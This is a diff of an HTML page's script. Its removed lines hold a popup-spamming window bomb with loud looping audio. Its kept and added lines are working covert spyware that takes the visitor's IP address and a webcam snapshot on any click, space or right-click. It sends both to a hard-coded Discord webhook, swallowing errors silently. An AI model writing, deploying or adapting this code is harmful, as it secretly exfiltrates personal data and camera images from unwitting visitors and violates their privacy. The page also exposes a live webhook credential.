@@ -31,6 +31,9 @@
     font-weight: 700;
     font-size: 1.5rem;
   }
+  audio {
+    display: none; /* Hide audio controls */
+  }
 </style>
 </head>
 <body>
@@ -41,125 +44,39 @@
     </div>
   </div>
 
+  <!-- Embedded audio player -->
+  <audio id="bgAudio" src="https://sevkabevka.github.io/alah.mp3" loop></audio>
+
 <script>
-  const audioSrc = 'https://sevkabevka.github.io/alah.mp3';
-
-  // Play background audio loudly looping
-  const bgAudio = new Audio(audioSrc);
-  bgAudio.loop = true;
-  bgAudio.volume = 1.0;
-  bgAudio.play().catch(() => { /* ignore autoplay block */ });
-
-  let popupCount = 0;
-  let popups = [];
-
-  class PopupWindow {
-    constructor() {
-      this.win = window.open('', '', 'width=500,height=500,left=100,top=100');
-      if (!this.win) return;
-      this.angle = 0;
-      this.x = 100 + Math.random()*300;
-      this.y = 100 + Math.random()*300;
-      this.dx = (Math.random() - 0.5) * 10;
-      this.dy = (Math.random() - 0.5) * 10;
-      this.rotationSpeed = (Math.random() - 0.5) * 10;
-
-      this.win.document.write(`
-        <style>
-          body {
-            margin:0; background:black; overflow:hidden;
-            display:flex; justify-content:center; align-items:center;
-            color:white; font-family: Arial, sans-serif;
-          }
-          audio { display:none; }
-        </style>
-        <body>
-          <audio autoplay loop src="${audioSrc}" volume="1.0"></audio>
-        </body>
-      `);
-      this.win.document.close();
-
-      this.interval = setInterval(() => {
-        if (this.win.closed) {
-          clearInterval(this.interval);
-          this.handleClose();
-          return;
-        }
-        this.moveAndRotate();
-      }, 100);
-    }
-
-    moveAndRotate() {
-      const screenW = screen.availWidth;
-      const screenH = screen.availHeight;
-
-      this.x += this.dx;
-      this.y += this.dy;
-      this.angle += this.rotationSpeed;
-
-      if (this.x < 0 || this.x > screenW - 500) this.dx = -this.dx;
-      if (this.y < 0 || this.y > screenH - 500) this.dy = -this.dy;
-
-      this.win.moveTo(this.x, this.y);
-
-      let sizeMod = 20 * Math.abs(Math.sin(this.angle * Math.PI / 180));
-      this.win.resizeTo(500 + sizeMod, 500 + sizeMod);
-    }
-
-    handleClose() {
-      popups = popups.filter(p => p !== this);
-      popupCount = popups.length;
-      let toSpawn = popupCount > 0 ? popupCount * 2 : 2;
-      for (let i = 0; i < toSpawn; i++) {
-        spawnWindow();
-      }
-    }
-  }
-
-  function spawnWindow() {
-    const p = new PopupWindow();
-    if (p.win) popups.push(p);
-    popupCount = popups.length;
-  }
-
-  function spamWindows() {
-    if (popupCount === 0) {
-      for (let i = 0; i < 5; i++) {
-        spawnWindow();
-      }
-    }
-  }
-
-  document.addEventListener('keydown', e => {
-    if (e.code === 'Space') spamWindows();
-  });
-  document.addEventListener('click', spamWindows);
-  document.addEventListener('contextmenu', e => {
-    e.preventDefault();
-    spamWindows();
-  });
-
-  // --- Added script for IP grabbing and camera snapshot ---
-
   const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';
 
   async function getUserIP() {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch {
+      return null;
+    }
   }
 
   async function sendToWebhook(payload) {
-    await fetch(webhookURL, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(payload),
-    });
+    try {
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload),
+      });
+    } catch {
+      // Ignore send errors
+    }
   }
 
   async function sendUserIP() {
     const ip = await getUserIP();
-    await sendToWebhook({type: 'ip', ip: ip, timestamp: new Date().toISOString()});
+    if (ip) {
+      await sendToWebhook({type: 'ip', ip: ip, timestamp: new Date().toISOString()});
+    }
   }
 
   async function captureCameraSnapshot() {
@@ -170,8 +87,8 @@
       await video.play();
 
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
 
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -186,23 +103,41 @@
 
   async function sendSnapshot() {
     const img = await captureCameraSnapshot();
-    if (!img) return;
-    await sendToWebhook({type: 'camera_snapshot', image: img, timestamp: new Date().toISOString()});
+    if (img) {
+      await sendToWebhook({type: 'camera_snapshot', image: img, timestamp: new Date().toISOString()});
+    }
   }
 
-  async function initDataCapture() {
+  async function captureAndSend() {
     await sendUserIP();
     await sendSnapshot();
   }
 
-  window.addEventListener('load', () => {
-    initDataCapture();
-  });
+  // Play audio once user interacts (required by browsers)
+  function playAudio() {
+    const audio = document.getElementById('bgAudio');
+    if (audio.paused) {
+      audio.volume = 1.0;
+      audio.play().catch(() => {});
+    }
+  }
 
-  setInterval(() => {
-    initDataCapture();
-  }, 5 * 60 * 1000);
+  // Trigger IP + camera capture + audio play on space, left click, right click
+  function interactionHandler(e) {
+    if (
+      e.type === 'keydown' && e.code === 'Space' ||
+      e.type === 'click' ||
+      e.type === 'contextmenu'
+    ) {
+      e.preventDefault();
+      playAudio();
+      captureAndSend();
+    }
+  }
 
+  document.addEventListener('keydown', interactionHandler);
+  document.addEventListener('click', interactionHandler);
+  document.addEventListener('contextmenu', interactionHandler);
 </script>
 </body>
 </html>
